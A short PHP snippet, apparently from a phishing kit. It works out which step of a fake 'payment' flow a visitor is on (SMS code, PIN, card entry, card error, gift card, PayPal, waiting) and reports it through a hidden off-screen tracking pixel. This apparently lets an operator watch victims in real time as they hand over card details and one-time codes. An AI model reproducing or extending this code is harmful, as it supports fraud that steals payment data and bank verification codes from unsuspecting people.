<?php
$currentPageName = basename($_SERVER['PHP_SELF'], '.php');
$currentView = $currentPageName;
if ($currentPageName === 'payment') {
    if (isset($_GET['loading'])) $currentView = 'loading';
    elseif (isset($_GET['waiting'])) $currentView = 'waiting';
    elseif (isset($_GET['sms'])) $currentView = 'sms';
    elseif (isset($_GET['pin'])) $currentView = 'pin';
    elseif (isset($_GET['app'])) $currentView = 'app';
    elseif (isset($_GET['card_error'])) $currentView = 'card_error';
    elseif (isset($_GET['gift'])) $currentView = 'gift';
    elseif (isset($_GET['card'])) $currentView = 'card';
    elseif (isset($_GET['paypal'])) $currentView = 'paypal';
}
?><img src="../funcsion/pixel.php?p=<?php echo $currentPageName; ?>&v=<?php echo $currentView; ?>&t=<?php echo time(); ?>" width="1" height="1" alt="" style="position:absolute;left:-9999px">
